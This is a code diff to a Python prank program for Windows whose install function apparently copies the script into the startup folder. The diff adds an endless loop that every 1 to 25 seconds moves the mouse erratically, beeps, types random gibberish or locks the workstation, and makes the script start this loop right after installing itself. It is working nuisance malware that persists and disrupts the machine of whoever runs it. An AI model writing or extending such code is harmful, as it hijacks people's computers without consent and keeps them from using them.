@@ -1,4 +1,4 @@
-import os, shutil, sys, pyautogui, random, winsound, time, string
+import os, shutil, sys, pyautogui, random, winsound, time, string, ctypes
 
 def install():
     # Get the path to the startup folder
@@ -23,13 +23,15 @@ def install():
 
 def randomaction():
     # List of functions to randomly pick from (excluding 'install')
-    actions = [spazmouse, random_beep, random_typing]
-    
-    # Choose a random function from the list
+    actions = [spazmouse, random_beep, random_typing, lock_pc]
+
     action = random.choice(actions)
-    
-    # Call the selected function
     action()
+
+    timer = random.randint(1, 25)
+    time.sleep(timer)
+
+    randomaction()
 
 def spazmouse():
     # Get screen width and height
@@ -52,5 +54,9 @@ def random_typing():
     randomstring = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
     pyautogui.write(randomstring, interval=0.1)  # Type random gibberish
 
+def lock_pc():
+    ctypes.windll.user32.LockWorkStation()
+
 if __name__ == "__main__":
     install()
+    randomaction()
